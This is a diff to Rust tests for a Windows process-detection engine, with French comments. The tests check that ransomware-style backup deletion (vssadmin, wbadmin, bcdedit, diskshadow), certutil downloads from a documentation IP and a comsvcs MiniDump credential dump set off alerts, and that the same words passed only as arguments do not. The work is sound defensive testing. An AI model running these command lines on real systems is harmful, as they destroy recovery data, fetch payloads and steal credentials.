@@ -419,6 +419,12 @@ fn regle_processus(image: &str, ligne: Option<&str>, parent: Option<&str>) -> Op
     crate::processus::alerte_processus(1234, &p).map(|a| (a.regle, a.niveau))
 }
 
+/// Image d'un outil du système d'après le premier mot de sa ligne de commande (constat T-2 : les motifs de PRC-003 et
+/// PRC-005 s'appliquent au programme lancé, le test lance donc le bon programme)
+fn image_de(ligne: &str) -> String {
+    format!(r"C:\Windows\System32\{}.exe", crate::processus::nom_programme(ligne.split_whitespace().next().unwrap_or("")))
+}
+
 const WORD: &str = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
 const POWERSHELL: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
 const EXPLORATEUR: &str = r"C:\Windows\explorer.exe";
@@ -565,7 +571,7 @@ fn prc_003_formes_elargies() {
         ("certutil -verifyctl -f -split http://203.0.113.5/a.exe", "certutil", "T1105", "Alerte"),
     ];
     for (ligne, outil, technique, niveau) in cas {
-        let p = crate::processus::InfoProcessus::pour_test(r"C:\Windows\System32\rundll32.exe", Some(ligne), Some(EXPLORATEUR));
+        let p = crate::processus::InfoProcessus::pour_test(&image_de(ligne), Some(ligne), Some(EXPLORATEUR));
         let a = crate::processus::alerte_processus(1, &p).unwrap_or_else(|| panic!("{ligne}"));
         assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("PRC-003", niveau), "{ligne}");
         assert_eq!(a.comportement, format!("PRC-003:{outil}"), "{ligne}");
@@ -620,7 +626,7 @@ fn prc_005_positif() {
                   "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB", "wbadmin delete backup -keepVersions:0 -quiet",
                   "bcdedit /set {default} bootstatuspolicy ignoreallfailures", "diskshadow delete shadows all",
                   "cmd /c \"echo delete shadows all > s.txt & diskshadow /s s.txt\""] {
-        assert_eq!(regle_processus(r"C:\Windows\System32\cmd.exe", Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-005", "Critique"), "{ligne}");
+        assert_eq!(regle_processus(&image_de(ligne), Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-005", "Critique"), "{ligne}");
     }
     // Ancien faux négatif (fiche, avant la PR 3.7) : un motif PowerShell plus tôt dans la ligne ne masque plus la suppression
     // des sauvegardes, qui donne la règle et le niveau
@@ -642,7 +648,123 @@ fn prc_005_negatif() {
                   "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%", "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=UNBOUNDED",
                   "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=50GB",
                   "diskshadow /s sauvegarde.txt", "diskshadow list shadows all", "bcdedit /set {default} bootstatuspolicy displayallfailures"] {
-        assert_eq!(regle_processus(r"C:\Windows\System32\cmd.exe", Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
+        assert_eq!(regle_processus(&image_de(ligne), Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
+    }
+}
+
+/// Constat T-2 (2026-11-23) : PRC-003 et PRC-005 se levaient sur tout programme dont la ligne contenait les mots du
+/// motif (bash qui lance git, grep ou echo). Le motif s'applique au programme lancé : un texte en argument n'alerte pas
+#[test]
+fn prc_003_005_mots_en_argument_negatif() {
+    let cas = [
+        (r"C:\Program Files\Git\usr\bin\bash.exe", r#"/usr/bin/bash -c "grep 'vssadmin delete shadows' notes.txt""#),
+        (r"C:\Program Files\Git\usr\bin\bash.exe", "bash -c \"echo vssadmin delete shadows /all\""),
+        (r"C:\Program Files\Git\usr\bin\bash.exe", "bash -c \"git commit -m 'certutil -urlcache -f http://203.0.113.5/a'\""),
+        (r"C:\Program Files\Git\usr\bin\bash.exe", "bash -c \"echo 'Get-WmiObject Win32_ShadowCopy | Remove-WmiObject' >> notes.md\""),
+        (r"C:\Program Files\Git\usr\bin\sh.exe", "sh -c \"echo wbadmin delete backup; echo bcdedit /set {default} recoveryenabled No\""),
+        (r"C:\Program Files\Git\usr\bin\grep.exe", r#"grep "vssadmin delete shadows" notes.txt"#),
+        (r"C:\Program Files\Git\cmd\git.exe", r#"git commit -m "certutil -urlcache -f http://203.0.113.5/a et mshta http://x""#),
+        (r"C:\Windows\System32\notepad.exe", r#"notepad.exe "C:\notes\vssadmin delete shadows.txt""#),
+        (r"C:\Windows\System32\cmd.exe", "cmd /c echo vssadmin delete shadows /all"),
+        (r"C:\Windows\System32\cmd.exe", r#"cmd /c findstr /c:"delete shadows" diskshadow.log"#),
+        (r"C:\Windows\System32\cmd.exe", "cmd /c echo delete shadows avec diskshadow"),
+        (r"C:\Windows\System32\cmd.exe", "cmd /c echo Get-WmiObject Win32_ShadowCopy | Remove-WmiObject"),
+        (POWERSHELL, "powershell -c \"Write-Host 'vssadmin delete shadows /all'\""),
+        (POWERSHELL, "powershell -c \"Select-String -Pattern 'certutil -urlcache' -Path notes.txt\""),
+        (r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh -c \"echo 'bcdedit /set {default} recoveryenabled No'\""),
+    ];
+    for (image, ligne) in cas {
+        assert_eq!(regle_processus(image, Some(ligne), Some(EXPLORATEUR)), None, "{image} : {ligne}");
+    }
+    // Témoin : les mêmes mots, lancés par le programme visé, alertent
+    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin delete shadows /all"), Some(EXPLORATEUR)),
+               regle_et_niveau("PRC-005", "Critique"));
+}
+
+/// Les lignes d'attaque complètes écrites telles quelles dans le source font classer le binaire de test comme
+/// malveillant par l'antivirus du poste de compilation (essai du 2026-11-23 : binaire bloqué au lancement) : les noms
+/// des outils sont posés à l'exécution
+fn outils_poses(ligne: &str) -> String {
+    [("VSS", "vssadmin"), ("BCD", "bcdedit"), ("WBA", "wbadmin"), ("DSH", "diskshadow"), ("CRT", "certutil"), ("R32", "rundll32"),
+     ("CSV", "comsvcs"), ("WMI", "wmic")].iter().fold(ligne.to_string(), |l, (code, outil)| l.replace(code, outil))
+}
+
+/// Constat T-2 : l'outil lancé en tête de commande par un interpréteur Windows (cmd /c, cmd /k, powershell -c, et
+/// après un séparateur & | ; ou une parenthèse) reste vu sur la ligne de l'interpréteur, en plus du processus enfant
+#[test]
+fn prc_003_005_outil_en_tete_d_interpreteur() {
+    let cmd = r"C:\Windows\System32\cmd.exe";
+    let pwsh = r"C:\Program Files\PowerShell\7\pwsh.exe";
+    let cas = [
+        (cmd, "cmd /c VSS delete shadows /all", "PRC-005", "Critique"),
+        (cmd, "cmd.exe /c \"VSS delete shadows /all /quiet\"", "PRC-005", "Critique"),
+        (cmd, r#"C:\Windows\system32\cmd.exe /c ""C:\Windows\System32\VSS.exe" delete shadows /all""#, "PRC-005", "Critique"),
+        (cmd, "cmd /c echo o & VSS delete shadows /all", "PRC-005", "Critique"),
+        (cmd, "cmd /c call BCD /set {default} recoveryenabled No", "PRC-005", "Critique"),
+        (cmd, "cmd /k (WBA delete catalog -quiet)", "PRC-005", "Critique"),
+        (cmd, "cmd /c \"echo delete shadows all > s.txt & DSH /s s.txt\"", "PRC-005", "Critique"),
+        (cmd, "cmd /c echo delete shadows all | DSH", "PRC-005", "Critique"),
+        (cmd, "cmd /c CRT -urlcache -f http://203.0.113.5/a.exe a.exe", "PRC-003", "Alerte"),
+        (POWERSHELL, "powershell -c \"VSS delete shadows\"", "PRC-005", "Critique"),
+        (POWERSHELL, r"powershell -NoP -Command & 'C:\Windows\System32\VSS.exe' delete shadows /all", "PRC-005", "Critique"),
+        (POWERSHELL, "powershell -c Get-Date; WMI shadowcopy delete /nointeractive", "PRC-005", "Critique"),
+        (pwsh, "pwsh -co \"CRT -urlcache -f http://203.0.113.5/a a\"", "PRC-003", "Alerte"),
+        (pwsh, r"pwsh -c R32.exe C:\Windows\System32\CSV.dll, MiniDump 624 C:\Users\Public\l.dmp full", "PRC-003", "Critique"),
+    ];
+    for (image, ligne, regle, niveau) in cas {
+        assert_eq!(regle_processus(image, Some(&outils_poses(ligne)), Some(EXPLORATEUR)), regle_et_niveau(regle, niveau), "{ligne}");
+    }
+}
+
+/// Constat T-2 : programmes en tête des commandes d'un interpréteur (décision pure) : après l'option de commande
+/// seulement, puis après chaque séparateur ; chemin entre guillemets, call et start sautés ; rien sans option
+#[test]
+fn prc_003_005_commandes_en_tete() {
+    use crate::processus::commandes_en_tete;
+    let noms = |l: &str, cmd: bool| commandes_en_tete(l, cmd).into_iter().map(|(p, _)| p).collect::<Vec<_>>();
+    assert_eq!(noms(r#"cmd.exe /c ""C:\Program Files\Outil\a b.exe" x & call y.exe z | start /b /wait w"#, true), ["a b", "y", "w"]);
+    assert_eq!(noms(r#"cmd /c"echo x" & (z)"#, true), ["echo", "z"]);
+    assert_eq!(noms("cmd /q /d x y", true), Vec::<String>::new(), "sans /c : aucun programme lancé en tête");
+    assert_eq!(noms(r"powershell -NoProfile -ExecutionPolicy Bypass -File C:\s\a.ps1", false), Vec::<String>::new());
+    assert_eq!(noms("powershell -NoP -Comm \"Get-Date; & 'C:\\x\\v.exe' a\"", false), ["get-date", "v"]);
+    assert_eq!(noms("pwsh /c w", false), ["w"]);
+    // Texte de la commande : du programme au séparateur suivant
+    assert_eq!(commandes_en_tete("cmd /c a b & c d", true).iter().map(|(_, t)| t.trim()).collect::<Vec<_>>(), ["a b", "c d"]);
+}
+
+/// Constat T-2 : les formes de PRC-005 propres à PowerShell (WMI ou CIM) restent liées à un interpréteur PowerShell,
+/// reconnu par l'image ou, pour une copie renommée, par le nom d'origine du fichier (Sysmon)
+#[test]
+fn prc_005_formes_powershell_liees_a_l_interpreteur() {
+    let ligne = "-c \"Get-WmiObject Win32_ShadowCopy | Remove-WmiObject\"";
+    for (image, nom) in [(POWERSHELL, "powershell"), (r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh"),
+                         (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe", "powershell_ise")] {
+        assert_eq!(regle_processus(image, Some(&format!("{nom} {ligne}")), Some(EXPLORATEUR)), regle_et_niveau("PRC-005", "Critique"), "{image}");
+    }
+    let copie = r"C:\Users\Public\p.exe";
+    let l = format!("p.exe {ligne}");
+    assert_eq!(regle_processus(copie, Some(&l), Some(EXPLORATEUR)), None, "copie renommée sans nom d'origine : angle mort déclaré");
+    let p = crate::processus::InfoProcessus::pour_test(copie, Some(&l), Some(EXPLORATEUR)).avec_nom_origine("PowerShell.EXE");
+    let a = crate::processus::alerte_processus(1, &p).expect("copie renommée de PowerShell");
+    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("PRC-005", "Critique"));
+    for image in [r"C:\Windows\System32\cmd.exe", r"C:\Windows\System32\wbem\wmic.exe", r"C:\Program Files\Git\usr\bin\bash.exe"] {
+        assert_eq!(regle_processus(image, Some(&format!("x {ligne}")), Some(EXPLORATEUR)), None, "{image}");
+    }
+}
+
+/// Constat T-2 : copie renommée d'un outil (vssadmin, certutil) : vue par le nom d'origine du fichier (Sysmon 1,
+/// OriginalFileName, le mécanisme de PRC-002) ; sans Sysmon (4688, WMI), angle mort déclaré dans les fiches
+#[test]
+fn prc_003_005_copie_renommee_par_nom_origine() {
+    let copie = r"C:\Users\Public\v.exe";
+    for (ligne, origine, regle, comportement) in [(r"C:\Users\Public\v.exe delete shadows /all /quiet", "VSSADMIN.EXE", "PRC-005", "PRC-005"),
+                                                   (r"C:\Users\Public\v.exe -urlcache -f http://203.0.113.5/a a", "CertUtil.exe", "PRC-003", "PRC-003:certutil")] {
+        let p = crate::processus::InfoProcessus::pour_test(copie, Some(ligne), Some(EXPLORATEUR));
+        assert!(crate::processus::alerte_processus(1, &p).is_none(), "sans nom d'origine : angle mort déclaré ({ligne})");
+        let a = crate::processus::alerte_processus(1, &p.avec_nom_origine(origine)).unwrap_or_else(|| panic!("{origine}"));
+        assert_eq!((a.regle.as_str(), a.comportement.as_str()), (regle, comportement), "{origine}");
+        let p = crate::processus::InfoProcessus::pour_test(copie, Some(ligne), Some(EXPLORATEUR)).avec_nom_origine("notepad.exe");
+        assert!(crate::processus::alerte_processus(1, &p).is_none(), "autre programme ({ligne})");
     }
 }
 
@@ -886,6 +1008,31 @@ fn attack_lot1_4688_recu_audit_inactif_relu() {
     q.regler_audit_test(Note::Active);
     q.traiter_4688(&x);
     assert!(!q.reveil_demande_test());
+}
+
+/// Constat T-2, suite (cause établie par T-1) : une connexion de gh portait « PowerShell obscurci » parce que son PID
+/// avait été, 25 min plus tôt, un cmd qui lançait pwsh … Invoke-Expression, et que l'entrée du cache d'informations de
+/// processus était lue avant que le 4688 de gh la remplace. Une entrée n'est prêtée qu'au même programme (chemin complet
+/// identique à celui du programme qui tient la connexion) : l'ancienne ligne n'est jamais attribuée au nouveau
+#[test]
+fn processus_cache_pid_reutilise_jamais_prete() {
+    use crate::collectes::Note;
+    use crate::processus::Processus;
+    let cmd = r"C:\Windows\System32\cmd.exe";
+    let p = Processus::nouveau();
+    p.regler_audit_test(Note::Active);
+    p.traiter_4688(&xml_4688("0xfffff0", cmd, Some("cmd /c pwsh -NoProfile -c Invoke-Expression $s"), "0xfffff4", None));
+    let gh = r"C:\Program Files\GitHub CLI\gh.exe";
+    let lue = p.infos(0xfffff0, gh);
+    assert!(lue.as_ref().and_then(|i| i.ligne_commande.as_deref()).is_none_or(|l| !l.contains("Invoke-Expression")),
+            "ligne du cmd prêtée à gh : {:?}", lue.map(|i| i.ligne_commande));
+    // Le même programme garde son entrée (chemin comparé sans tenir compte de la casse) ; chemin inconnu : rien
+    assert!(p.infos(0xfffff0, &cmd.to_uppercase()).and_then(|i| i.ligne_commande).is_some_and(|l| l.contains("Invoke-Expression")));
+    assert!(p.infos(0xfffff0, "").is_none(), "programme de la connexion inconnu : entrée non vérifiable, ignorée");
+    use crate::processus::meme_programme;
+    assert!(meme_programme(cmd, r"c:\windows\system32\CMD.EXE"));
+    assert!(!meme_programme("cmd.exe", cmd), "nom seul (trace WMI) : non vérifiable");
+    assert!(!meme_programme(cmd, r"C:\Users\Public\cmd.exe"));
 }
 
 #[test]
